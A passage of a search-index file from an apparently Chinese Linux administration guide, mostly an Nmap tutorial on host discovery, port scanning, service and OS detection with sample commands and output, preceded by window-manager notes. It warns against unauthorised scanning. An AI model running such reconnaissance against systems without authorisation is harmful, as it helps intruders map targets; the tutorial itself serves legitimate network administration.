\u200b\u5230\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u521b\u5efa\u200b\u7684\u200b\u6846\u67b6\u200b\u7a97\u53e3\u200b\u4e2d\u200b\uff0c\u200b\u4ee5\u6b64\u200b\u5b9e\u73b0\u200b\u8ba9\u200b\u7a0b\u5e8f\u200b\u7a97\u53e3\u200b\u88ab\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u63a7\u5236\u200b\u3001\u200b\u88c5\u9970\u200b\u7684\u200b\u6548\u679c\u200b\u3002</p> <p>\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u4e0e\u200b X \u200b\u670d\u52a1\u5668\u4e4b\u95f4\u200b\u7684\u200b\u4ea4\u4e92\u200b\u6709\u200b\u4e00\u4e9b\u200b\u6807\u51c6\u89c4\u8303\u200b\uff0c\u200b\u4f8b\u5982\u200b ICCCM \u200b\u4e0e\u200b EWMH\uff0c\u200b\u4ee5\u200b\u51cf\u5c0f\u200b\u4e0d\u540c\u200b\u7684\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u5b9e\u73b0\u200b\u4e4b\u95f4\u200b\u7684\u200b\u6df7\u4e71\u200b\u4e0e\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u672c\u8eab\u200b\u4e5f\u200b\u662f\u200b\u4e00\u4e2a\u200b\u72ec\u7acb\u200b\u7684\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u5982\u679c\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u9000\u51fa\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5176\u4ed6\u200b\u7684\u200b X \u200b\u5ba2\u6237\u7aef\u200b\u4e0d\u4f1a\u200b\u505c\u6b62\u200b\u8fd0\u884c\u200b\uff0c\u200b\u4f46\u662f\u200b\u4f60\u200b\u53ef\u80fd\u200b\u65e0\u6cd5\u200b\u518d\u200b\u63a7\u5236\u200b\u5b83\u4eec\u200b\u4e86\u200b\uff08\u200b\u4f8b\u5982\u200b\uff0c\u200b\u53ef\u80fd\u200b\u5b83\u4eec\u200b\u88ab\u200b\u522b\u7684\u200b\u7a97\u53e3\u200b\u6321\u4f4f\u200b\u4e86\u200b\uff0c\u200b\u800c\u200b\u6ca1\u6709\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u7684\u200b\u88c5\u9970\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4f60\u200b\u53ef\u80fd\u200b\u6ca1\u6709\u200b\u529e\u6cd5\u200b\u79fb\u52a8\u200b\u5b83\u4eec\u200b\uff09\u3002\u200b\u8fd9\u79cd\u200b\u5206\u79bb\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u4e5f\u200b\u5e2e\u52a9\u200b\u5b55\u80b2\u200b\u4e86\u200b\u5f88\u591a\u200b\u72ec\u7279\u200b\u7684\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5e73\u94fa\u200b\u5f0f\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\uff08\u200b\u4f8b\u5982\u200b i3wm\uff09\uff0c\u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u4f20\u7edf\u200b\u7684\u200b\u6d6e\u52a8\u5f0f\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u81ea\u52a8\u200b\u4ee5\u200b\u4e0d\u200b\u91cd\u53e0\u200b\u7684\u200b\u65b9\u5f0f\u200b\u663e\u793a\u200b\u5f53\u524d\u200b\u7684\u200b\u6240\u6709\u200b\u7a97\u53e3\u200b\uff0c\u200b\u7528\u6237\u200b\u4e0d\u200b\u9700\u8981\u200b\u518d\u7528\u200b\u9f20\u6807\u200b\u624b\u52a8\u200b\u8c03\u6574\u200b\u6bcf\u4e2a\u200b\u7a97\u53e3\u200b\u7684\u200b\u5927\u5c0f\u200b\u7b49\u7b49\u200b\u3002</p>"},{"location":"advanced/desktop/#x-protocol","title":"X \u200b\u534f\u8bae","text":"<p>(TODO)</p>"},{"location":"advanced/desktop/#wayland","title":"Wayland","text":""},{"location":"advanced/desktop/#dbus","title":"DBus","text":""},{"location":"advanced/elk/","title":"ELK","text":"<p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p>"},{"location":"advanced/nmap/","title":"Nmap","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky\u3001@sscscc</p> <p>\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b</p> <p>Nmap\uff08Network Mapper\uff09\u200b\u662f\u200b\u5f00\u6e90\u200b\u7684\u200b\u7f51\u7edc\u200b\u63a2\u6d4b\u200b\u548c\u200b\u5b89\u5168\u68c0\u67e5\u200b\u5de5\u5177\u200b\u3002\u200b\u5176\u200b\u4e3b\u8981\u200b\u529f\u80fd\u200b\u5305\u62ec\u200b\u4e3b\u673a\u200b\u53d1\u73b0\u200b\u3001\u200b\u7aef\u53e3\u626b\u63cf\u200b\u3001\u200b\u670d\u52a1\u200b\u7248\u672c\u200b\u63a2\u6d4b\u200b\u3001\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u68c0\u6d4b\u200b\u3001\u200b\u811a\u672c\u200b\u626b\u63cf\u200b\u7b49\u200b\u3002\u200b\u4e0d\u7ba1\u200b\u662f\u200b\u5728\u200b\u7ea2\u65b9\u200b\uff08\u200b\u653b\u51fb\u200b\u65b9\u200b\uff09\u200b\u8fd8\u662f\u200b\u84dd\u65b9\u200b\uff08\u200b\u9632\u5fa1\u200b\u65b9\u200b\uff09\u200b\u7684\u200b\u5de5\u4f5c\u200b\u4e2d\u200b\uff0cNmap \u200b\u90fd\u200b\u662f\u200b\u4e00\u4e2a\u200b\u975e\u5e38\u200b\u6709\u7528\u200b\u7684\u200b\u5de5\u5177\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u4ecb\u7ecd\u200b Nmap \u200b\u7684\u200b\u5e38\u7528\u200b\u529f\u80fd\u200b\u3002</p> <p>\u200b\u8bf7\u52ff\u200b\u8fdb\u884c\u200b\u672a\u7ecf\u200b\u6388\u6743\u200b\u7684\u200b\u626b\u63cf\u200b\u64cd\u4f5c\u200b</p> <p>\u200b\u518d\u6b21\u200b\u91cd\u590d\u200b\uff1a\u200b\u626b\u63cf\u5668\u200b\u672c\u8eab\u200b\u662f\u200b\u4e2d\u6027\u200b\u7684\u200b\u5de5\u5177\u200b\uff0c\u200b\u65e2\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u68c0\u67e5\u200b\u5df2\u6709\u200b\u7684\u200b\u7cfb\u7edf\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u653b\u51fb\u8005\u200b\u5feb\u901f\u200b\u53d1\u73b0\u200b\u5df2\u6709\u200b\u7684\u200b\u5b89\u5168\u6f0f\u6d1e\u200b\u3002\u200b\u8bf7\u4ec5\u200b\u5728\u200b\u5f97\u5230\u200b\u6388\u6743\u200b\u7684\u200b\u524d\u63d0\u200b\u4e0b\u200b\u4f7f\u7528\u200b\u8fd9\u200b\u7c7b\u200b\u5de5\u5177\u200b\uff0c\u200b\u5426\u5219\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6709\u200b\u4e25\u91cd\u200b\u7684\u200b\u6cd5\u5f8b\u200b\u98ce\u9669\u200b\u3002</p> <p>GUI \u200b\u7248\u672c\u200b</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u4e0d\u200b\u559c\u6b22\u200b\u547d\u4ee4\u884c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Zenmap\uff0c\u200b\u5b83\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u76f8\u5bf9\u200b\u7528\u6237\u200b\u53cb\u597d\u200b\u7684\u200b\u754c\u9762\u200b\u6765\u200b\u8fd0\u884c\u200b Nmap\u3002</p>"},{"location":"advanced/nmap/#basic-scanning","title":"\u57fa\u672c\u200b\u626b\u63cf","text":"<p>\u200b\u5bf9\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\uff0cNmap \u200b\u7684\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u7528\u9014\u200b\u662f\u200b\u641e\u6e05\u695a\u200b\u81ea\u5df1\u200b\u7ba1\u7406\u200b\u7684\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u8d44\u4ea7\u200b\u60c5\u51b5\u200b\u3002Nmap \u200b\u53ef\u4ee5\u200b\u626b\u63cf\u200b\u6307\u5b9a\u200b\u7f51\u6bb5\u200b\u4e2d\u200b\u5b58\u6d3b\u200b\uff08\u200b\u5728\u7ebf\u200b\uff09\u200b\u7684\u200b\u4e3b\u673a\u200b\u4e0e\u200b\u5f00\u653e\u200b\u7684\u200b\u7aef\u53e3\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u5047\u8bbe\u200b\u7f51\u7edc\u200b\u6bb5\u200b\u4e3a\u200b 192.168.1.0/24\u3002</p> <p>\u200b\u626b\u63cf\u200b\u5230\u200b\u54ea\u91cc\u200b\u4e86\u200b\uff1f</p> <p>\u200b\u5728\u200b\u626b\u63cf\u200b\u4e2d\u200b\u6309\u200b\u4e0b\u200b\u4efb\u610f\u952e\u200b\u53ef\u4ee5\u200b\u663e\u793a\u200b\u8fdb\u5ea6\u200b\u3002</p>"},{"location":"advanced/nmap/#alive-detection","title":"\u5b58\u6d3b\u200b\u68c0\u6d4b","text":"<p>Nmap \u200b\u7684\u200b <code>-sn</code> \u200b\u9009\u9879\u200b\u4f1a\u200b\u5173\u95ed\u200b\u7aef\u53e3\u626b\u63cf\u200b\uff0c\u200b\u53ea\u200b\u8fdb\u884c\u200b\u5b58\u6d3b\u200b\u68c0\u6d4b\u200b\u3002<code>-sn</code> \u200b\u9009\u9879\u200b\u4f1a\u200b\u53d1\u9001\u200b ICMP Echo\uff08ping\uff09\u3001TCP SYN \u200b\u5230\u200b 443\uff08HTTPS\uff09\u200b\u7aef\u53e3\u200b\u548c\u200b TCP ACK \u200b\u5230\u200b 80\uff08HTTP\uff09\u200b\u7aef\u53e3\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u53d1\u9001\u200b ICMP Timestamp \u200b\u8bf7\u6c42\u200b\u6765\u200b\u68c0\u6d4b\u200b\u4e3b\u673a\u200b\u662f\u5426\u200b\u5728\u7ebf\u200b\u3002</p> <p>\u200b\u4e3a\u4ec0\u4e48\u200b TCP SYN \u200b\u5230\u200b 443\uff0c\u200b\u4f46\u662f\u200b TCP ACK \u200b\u5230\u200b 80\uff1f</p> <p>\u200b\u5f88\u591a\u200b\u9632\u706b\u5899\u200b\u4f1a\u200b\u914d\u7f6e\u200b\u76f4\u63a5\u200b\u4e22\u5f03\u200b\u5bf9\u975e\u200b\u516c\u5f00\u200b\u670d\u52a1\u200b\u7aef\u53e3\u200b\u7684\u200b TCP SYN \u200b\u8bf7\u6c42\u200b\u5305\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u662f\u200b\u6240\u6709\u200b\u9632\u706b\u5899\u200b\u90fd\u200b\u4f1a\u200b\u4e22\u5f03\u200b TCP ACK \u200b\u8bf7\u6c42\u200b\u5305\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u5bf9\u5e94\u200b\u9632\u706b\u5899\u200b\u6ca1\u6709\u200b\u8bb0\u5f55\u200b TCP \u200b\u8fde\u63a5\u200b\u72b6\u6001\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u3002\u200b\u56e0\u6b64\u200b\u91c7\u53d6\u200b\u4e0d\u540c\u200b\u7684\u200b TCP \u200b\u5305\u200b\u63a2\u6d4b\u200b\u65b9\u5f0f\u200b\u53ef\u4ee5\u200b\u63d0\u9ad8\u200b\u5b58\u6d3b\u200b\u68c0\u6d4b\u200b\u7684\u200b\u6210\u529f\u7387\u200b\u3002</p> <p>ICMP Timestamp</p> <p>ICMP Timestamp \u200b\u8bf7\u6c42\u200b\u662f\u200b\u4e00\u4e2a\u200b\u8f83\u200b\u5c11\u200b\u4f7f\u7528\u200b\u7684\u200b ICMP \u200b\u7c7b\u578b\u200b\uff0c\u200b\u7528\u6765\u200b\u83b7\u53d6\u200b\u76ee\u6807\u200b\u4e3b\u673a\u200b\u7684\u200b\u65f6\u95f4\u200b\u4fe1\u606f\u200b\u3002\u200b\u90e8\u5206\u200b\u73b0\u4ee3\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u9ed8\u8ba4\u200b\u4e0d\u200b\u54cd\u5e94\u200b\u6b64\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Nmap \u200b\u63d0\u4f9b\u200b\u7684\u200b <code>nping</code> \u200b\u5de5\u5177\u200b\u6d4b\u8bd5\u200b\uff1a</p> <pre><code>sudo nping --icmp --icmp-type timestamp 192.168.1.2\n</code></pre> <p>\u200b\u4f7f\u7528\u200b root \u200b\u6267\u884c\u200b</p> <p>\u200b\u7531\u4e8e\u200b\u53d1\u9001\u200b ICMP \u200b\u5305\u200b\u9700\u8981\u200b\u7279\u6743\u200b\uff08\u200b\u521b\u5efa\u200b raw socket\uff09\uff0c\u200b\u5982\u679c\u200b\u5e0c\u671b\u200b Nmap \u200b\u628a\u200b\u6240\u6709\u200b\u7684\u200b\u626b\u63cf\u200b\u65b9\u6cd5\u200b\u90fd\u200b\u7528\u200b\u4e0a\u200b\uff0c\u200b\u5efa\u8bae\u200b\u91c7\u7528\u200b <code>sudo</code> \u200b\u6267\u884c\u200b Nmap\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u53ea\u200b\u53d1\u9001\u200b TCP SYN\u3001TCP ACK \u200b\u4e5f\u200b\u9700\u8981\u200b\u7279\u6743\u200b\uff0c\u200b\u5982\u679c\u200b\u4ee5\u200b\u666e\u901a\u7528\u6237\u200b\u8fd0\u884c\u200b\uff0cNmap \u200b\u4f1a\u200b\u4f7f\u7528\u200b <code>connect()</code> \u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u6765\u200b\u68c0\u6d4b\u200b\u5b58\u6d3b\u200b\u4e3b\u673a\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ea\u200b\u53d1\u9001\u200b TCP ACK \u200b\u5728\u200b\u8fd9\u79cd\u200b\u6761\u4ef6\u200b\u4e0b\u200b\u65e0\u6cd5\u200b\u5b9e\u73b0\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u626b\u63cf\u200b\u7684\u200b\u662f\u200b\u672c\u5730\u7f51\u7edc\u200b\u5e76\u4e14\u200b\u662f\u200b root\uff0cNmap \u200b\u8fd8\u4f1a\u200b\u5c1d\u8bd5\u200b\u4f7f\u7528\u200b ARP \u200b\u8bf7\u6c42\u200b\u6765\u200b\u68c0\u6d4b\u200b\u5b58\u6d3b\u200b\u4e3b\u673a\u200b\u3002</p> <p>\u200b\u5173\u95ed\u200b DNS \u200b\u89e3\u6790\u200b</p> <p>Nmap \u200b\u9ed8\u8ba4\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u4ece\u200b IP \u200b\u5730\u5740\u200b\u4f7f\u7528\u200b DNS \u200b\u89e3\u6790\u200b\u4e3b\u673a\u540d\u200b\uff0c\u200b\u8fd9\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u662f\u200b\u6ca1\u6709\u200b\u5fc5\u8981\u200b\u7684\u200b\uff0c\u200b\u800c\u4e14\u200b\u4f1a\u200b\u5360\u7528\u200b\u5927\u91cf\u200b\u65f6\u95f4\u200b\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-n</code> \u200b\u9009\u9879\u200b\u5173\u95ed\u200b DNS \u200b\u89e3\u6790\u200b\u3002</p> <p>\u200b\u51cf\u5c0f\u200b\u7b49\u5f85\u65f6\u95f4\u200b</p> <p>Nmap \u200b\u7684\u200b <code>-T</code> \u200b\u53c2\u6570\u200b\u4f1a\u200b\u63a7\u5236\u200b\u64cd\u4f5c\u200b\u7684\u200b\u65f6\u95f4\u200b\u95f4\u9694\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u662f\u200b <code>-T3</code>\u3002\u200b\u5982\u679c\u200b\u7f51\u7edc\u200b\u60c5\u51b5\u200b\u597d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-T4</code> \u200b\u6216\u200b <code>-T5</code> \u200b\u6765\u200b\u52a0\u5feb\u200b\u626b\u63cf\u200b\u901f\u5ea6\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-P</code> \u200b\u7cfb\u5217\u200b\u53c2\u6570\u200b\u9650\u5236\u200b\u5b58\u6d3b\u200b\u68c0\u6d4b\u200b\u7684\u200b\u65b9\u5f0f\u200b\uff08\u200b\u9ed8\u8ba4\u200b\u884c\u4e3a\u200b\u76f8\u5f53\u4e8e\u200b <code>-PE -PS443 -PA80 -PP</code>\uff09\uff0c\u200b\u4f8b\u5982\u200b\u53ea\u200b\u5141\u8bb8\u200b\u8fdb\u884c\u200b ICMP Echo \u200b\u8bf7\u6c42\u200b\uff08\u200b\u5728\u200b\u6743\u9650\u200b\u4e0d\u8db3\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cNmap \u200b\u4f1a\u200b\u81ea\u52a8\u200b\u964d\u7ea7\u200b\u5230\u200b\u4f7f\u7528\u200b TCP\uff09\uff1a</p> <pre><code>nmap -n -sn -PE 192.168.1.0/24\n</code></pre> <p>\u200b\u6216\u8005\u200b\u53ea\u200b\u5141\u8bb8\u200b TCP SYN \u200b\u5230\u200b 443 \u200b\u7aef\u53e3\u200b\uff1a</p> <pre><code>nmap -n -sn -PS443 192.168.1.0/24\n</code></pre> <p>\u200b\u8df3\u8fc7\u200b\u67d0\u4e9b\u200b\u4e3b\u673a\u200b</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u60f3\u200b\u626b\u63cf\u200b\u6574\u4e2a\u200b\u7f51\u7edc\u200b\uff0c\u200b\u4f46\u200b\u9700\u8981\u200b\u8df3\u8fc7\u200b\u67d0\u4e9b\u200b\u4e3b\u673a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>--exclude</code> \u200b\u9009\u9879\u200b\u3002</p> <p>\u200b\u7b2c\u4e00\u5929\u200b\u7684\u200b\u5de5\u4f5c\u200b</p> <p>\u200b\u5047\u8bbe\u200b\u4f60\u200b\u521a\u521a\u200b\u52a0\u5165\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u56e2\u961f\u200b\uff0c\u200b\u4e0a\u200b\u4e00\u4efb\u200b\u7684\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u6ca1\u6709\u200b\u7559\u4e0b\u200b\u4efb\u4f55\u200b\u6587\u6863\u200b\u3002\u200b\u4e3a\u4e86\u200b\u641e\u6e05\u695a\u200b\u6709\u200b\u54ea\u4e9b\u200b\u673a\u5668\u200b\uff0c\u200b\u4f60\u200b\u9700\u8981\u200b\u505a\u200b\u4ec0\u4e48\u200b\u6765\u200b\u83b7\u53d6\u200b\u4f60\u200b\u9700\u8981\u200b\u626b\u63cf\u200b\u7684\u200b\u7f51\u6bb5\u200b\uff1f</p>"},{"location":"advanced/nmap/#port-scanning","title":"\u7aef\u53e3\u626b\u63cf","text":"<p>\u200b\u83b7\u53d6\u200b\u5b58\u6d3b\u200b\u4e3b\u673a\u200b\u540e\u200b\uff0c\u200b\u4e0b\u200b\u4e00\u6b65\u200b\u662f\u200b\u83b7\u53d6\u200b\u8fd9\u4e9b\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u5f00\u653e\u200b\u7684\u200b\u7aef\u53e3\u200b\u3002\u200b\u6700\u200b\u5e38\u7528\u200b\u7684\u200b\u626b\u63cf\u200b\u65b9\u5f0f\u200b\u6709\u200b\u4e09\u79cd\u200b\uff1a</p> <ul> <li>TCP SYN \u200b\u626b\u63cf\u200b <code>-sS</code>\uff08\u200b\u9700\u8981\u200b\u7279\u6743\u200b\uff09</li> <li>TCP connect \u200b\u626b\u63cf\u200b <code>-sT</code></li> <li>UDP \u200b\u626b\u63cf\u200b <code>-sU</code></li> </ul> <p>\u200b\u6b64\u5916\u200b\uff0cNmap \u200b\u9ed8\u8ba4\u200b\u53ea\u4f1a\u200b\u626b\u63cf\u200b\u6700\u200b\u5e38\u7528\u200b\u7684\u200b 1000 \u200b\u79cd\u200b\u7aef\u53e3\u200b\u3002<code>-p</code> \u200b\u9009\u9879\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u8981\u200b\u626b\u63cf\u200b\u7684\u200b\u7aef\u53e3\u200b\uff08\u200b\u4f8b\u5982\u200b <code>-p 12345</code>\uff09\uff0c\u200b\u6216\u8005\u200b\u7aef\u53e3\u200b\u8303\u56f4\u200b\uff08\u200b\u4f8b\u5982\u200b <code>-p 1-1024</code>\uff09\u3002\u200b\u5982\u679c\u200b\u5e0c\u671b\u200b\u8ba9\u200b Nmap \u200b\u626b\u63cf\u200b\u6240\u6709\u200b\u7aef\u53e3\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-p-</code>\u3002</p> <p>\u200b\u626b\u63cf\u200b\u7f51\u6bb5\u200b\u5185\u200b\u7684\u200b\u6307\u5b9a\u200b\u7aef\u53e3\u200b</p> <p>\u200b\u4f60\u200b\u60f3\u200b\u626b\u63cf\u200b\u6574\u4e2a\u200b\u7f51\u6bb5\u200b\u5185\u6709\u200b\u54ea\u4e9b\u200b\u4e3b\u673a\u200b\u5f00\u653e\u200b\u4e86\u200b 22 \u200b\u7aef\u53e3\u200b\uff08SSH\uff09\uff0c\u200b\u5e94\u8be5\u200b\u600e\u4e48\u200b\u5199\u200b\u53c2\u6570\u200b\uff1f</p> <p>rustscan \u200b\u548c\u200b masscan</p> <p>\u200b\u5728\u200b\u7aef\u53e3\u626b\u63cf\u200b\u9886\u57df\u200b\uff0c\u200b\u9664\u4e86\u200b Nmap \u200b\u4ee5\u5916\u200b\u8fd8\u6709\u200b\u4e00\u4e9b\u200b\u5176\u4ed6\u200b\u7684\u200b\u5de5\u5177\u200b\u3002\u200b\u5176\u4e2d\u200b\u5e38\u7528\u200b\u7684\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>rustscan\uff0c\u200b\u5176\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b\u5c31\u200b\u80fd\u591f\u200b\u975e\u5e38\u200b\u5feb\u901f\u200b\u626b\u63cf\u200b\u5168\u90e8\u200b\u7aef\u53e3\u200b\u3002</li> <li>masscan\uff0c\u200b\u7528\u4e8e\u200b\u8d85\u5927\u89c4\u6a21\u200b\u626b\u63cf\u200b\u7684\u200b\u5de5\u5177\u200b\uff0c\u200b\u5176\u200b\u5ba3\u79f0\u200b\u53ef\u4ee5\u200b\u5728\u200b 5 \u200b\u5206\u949f\u200b\u5185\u200b\u626b\u63cf\u200b\u6574\u4e2a\u200b\u4e92\u8054\u7f51\u200b\u3002</li> </ul>"},{"location":"advanced/nmap/#further-detection","title":"\u8fdb\u4e00\u6b65\u200b\u68c0\u6d4b","text":""},{"location":"advanced/nmap/#service-and-version-detection","title":"\u670d\u52a1\u200b\u548c\u200b\u7248\u672c\u200b\u68c0\u6d4b","text":"<p><code>-sV</code> \u200b\u9009\u9879\u200b\u53ef\u4ee5\u200b\u8ba9\u200b Nmap \u200b\u5c1d\u8bd5\u200b\u68c0\u6d4b\u200b\u5f00\u653e\u200b\u7aef\u53e3\u200b\u4e0a\u200b\u8fd0\u884c\u200b\u7684\u200b\u670d\u52a1\u200b\u548c\u200b\u7248\u672c\u4fe1\u606f\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5f88\u591a\u200b\u7f51\u7edc\u670d\u52a1\u200b\u7684\u200b\u5b9e\u73b0\u200b\u90fd\u200b\u4f1a\u200b\u4ee5\u200b\u67d0\u79cd\u200b\u65b9\u5f0f\u200b\u900f\u9732\u200b\u81ea\u5df1\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4f8b\u5982\u200b SSH \u200b\u670d\u52a1\u200b\u4f1a\u200b\u5728\u200b\u8fde\u63a5\u200b\u65f6\u200b\u53d1\u9001\u200b\u7248\u672c\u4fe1\u606f\u200b\uff1a</p> <pre><code>$ nc example.com 22\nSSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u6\n</code></pre> <p>\u200b\u670d\u52a1\u200b\u548c\u200b\u7248\u672c\u200b\u68c0\u6d4b\u200b\u8017\u8d39\u200b\u65f6\u95f4\u200b\u8f83\u957f\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u5728\u200b\u4e0d\u200b\u9650\u5236\u200b\u7aef\u53e3\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u3002\u200b\u4e00\u4e2a\u200b\u68c0\u6d4b\u200b\u4f8b\u5b50\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>$ nmap -sV 192.168.1.247\nStarting Nmap 7.97 ( https://nmap.org ) at 2025-08-03 21:43 +0800\nNmap scan report for bogon (192.168.1.247)\nHost is up (0.000069s latency).\nNot shown: 992 closed tcp ports (conn-refused)\nPORT      STATE SERVICE           VERSION\n22/tcp    open  ssh               OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n80/tcp    open  http              OpenResty web app server 1.27.1.2\n111/tcp   open  rpcbind           2-4 (RPC #100000)\n1145/tcp  open  http              Caddy httpd\n2049/tcp  open  nfs_acl           3 (RPC #100227)\n3260/tcp  open  iscsi?\n10000/tcp open  snet-sensor-mgmt?\n10001/tcp open  http              Node.js Express framework\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\n\uff08\u200b\u7701\u7565\u200b\uff09\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 172.50 seconds\n</code></pre>"},{"location":"advanced/nmap/#os-detection","title":"\u64cd\u4f5c\u7cfb\u7edf\u200b\u68c0\u6d4b","text":"<p><code>-O</code> \u200b\u9009\u9879\u200b\u53ef\u4ee5\u200b\u8ba9\u200b Nmap \u200b\u5c1d\u8bd5\u200b\u68c0\u6d4b\u200b\u76ee\u6807\u200b\u4e3b\u673a\u200b\u7684\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u3002Nmap \u200b\u4f1a\u200b\u6839\u636e\u200b TCP/IP \u200b\u534f\u8bae\u200b\u6808\u200b\u7684\u200b\u7279\u5f81\u200b\u6765\u200b\u731c\u6d4b\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7c7b\u578b\u200b\u548c\u200b\u7248\u672c\u200b\u3002\u200b\u8be5\u200b\u64cd\u4f5c\u200b\u9700\u8981\u200b\u7279\u6743\u200b\u3002</p> <pre><code>$ sudo nmap -O 192.168.1.253\n\uff08\u200b\u7701\u7565\u200b\uff09\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\n\uff08\u200b\u7701\u7565\u200b\uff09\n</code></pre>"},{"location":"advanced/nmap/#scripts","title":"\u811a\u672c\u200b\u7b80\u4ecb","text":"<p>Nmap \u200b\u7684\u200b Nmap Scripting Engine\uff08NSE\uff09\u200b\u529f\u80fd\u200b\u5141\u8bb8\u200b\u7528\u6237\u200b\u7f16\u5199\u200b Lua \u200b\u811a\u672c\u200b\u6269\u5c55\u200b Nmap \u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u6267\u884c\u200b\u81ea\u52a8\u5316\u200b\u4efb\u52a1\u200b\u3002\u200b\u76ee\u524d\u200b\uff0cNmap \u200b\u81ea\u5e26\u200b\u4e86\u200b\u516d\u767e\u591a\u79cd\u200b NSE \u200b\u811a\u672c\u200b\uff0c\u200b\u5206\u4e3a\u200b\u4e0d\u540c\u200b\u7684\u200b\u51e0\u7c7b\u200b\uff08\u200b\u8be6\u89c1\u200b Usage and Examples\uff09\u3002\u200b\u4f7f\u7528\u200b <code>-sC</code> \u200b\u6216\u200b <code>--script=default</code> \u200b\u9009\u9879\u200b\u53ef\u4ee5\u200b\u8ba9\u200b Nmap 